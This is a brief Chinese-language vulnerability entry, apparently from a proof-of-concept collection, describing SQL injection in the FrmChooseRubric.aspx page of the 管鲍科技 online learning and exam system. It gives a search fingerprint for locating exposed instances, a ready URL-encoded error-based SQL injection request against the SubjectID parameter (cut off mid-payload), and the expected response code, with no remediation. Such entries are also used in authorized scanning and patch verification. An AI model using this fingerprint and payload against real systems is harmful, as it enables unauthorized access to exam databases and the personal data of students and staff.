# 管鲍科技在线学习考试系统FrmChooseRubric.aspx存在SQL注入漏洞

- **系统**：管鲍科技在线学习考试系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Image/NORightMouse.js"`
- **请求**：`GET /WorkExam/FrmChooseRubric.aspx?Num=-1&RubricID=-1&SubjectID=%27%29%20AND%202075%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282075%3D2075%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113`
- **预期**：200　|　—